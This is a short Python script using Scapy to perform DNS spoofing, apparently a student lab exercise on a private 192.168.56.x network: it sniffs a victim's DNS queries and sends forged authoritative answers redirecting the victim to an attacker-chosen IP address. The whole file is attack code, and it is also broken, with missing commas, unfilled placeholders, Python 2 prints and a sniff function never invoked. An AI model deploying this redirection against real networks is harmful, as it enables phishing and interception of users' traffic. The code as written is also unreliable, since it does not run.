from scapy.all import *

victimIP = "192.168.56.101"
spoofedIP = "192.168.56.102"

#function which will execute for every sniffed packet, automatically creates response packet and sends it to the victim
#packet -> refers to the packet that is sent from victim to server
def dnsResponse ( packet ) :
    #Ether filed, we swap the destination(mac addre of the website the victim tried to access)and source(Victim)
    #So the packet pretend to be coming from website to the victim
    ether = Ether(
            src = packet[Ether].dst,
            #question, how does it know the destination mac address?
            dst = packet[Ether].src          
            )
    #IP filed, same process as above
    ip = IP(
         src = packet[IP].dst,
         dst = victimIP
    )
    #UDP filed, same process as above 
    udp = UDP(
          sport = packet[UDP].dport,
          dport = packet[UDP].sport
    )
    #DNS filed
    dns = DNS(
            # id details are the same
            id = packet[DNS].id,
            # Query details are the same
            qd = packet[DNS].qd, 
            #Question/Respond flag, qr=1: response, qr=0: question
            qr = 1, 
            # authoritative answer flag, aa=1: responding name server is authoritative for the quired domain
            aa = 1,
            #Resource Record 
            qdcount = 1
            ancount = 1
            nscount = 0 
            arcount = 0

            an = DNSRR (
                rrname = packet[DNS].qd.qname,
                ttl = 100
                rdata = <Ip of website that we want victim to go>
            )
    )

    responsePacket = ether / ip / udp / dns

    print "DNS spoofed"
    sendp(responsePacket, iface= <network>)
    print "Spoofed DNS, Different IP address is sent"
    


#have to find DNS packets that is coming out of victim's IP
def dnsSniff( packet ) : 
    packet_filter = "udp and port 53 and src host " + str(victimIP)

    #The packet is a DNS packet with question flag 
   # if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
        
           
    sniff(filter = packet_filter, prn = dnsResponse, iface = <network>, count=1 )
            
    
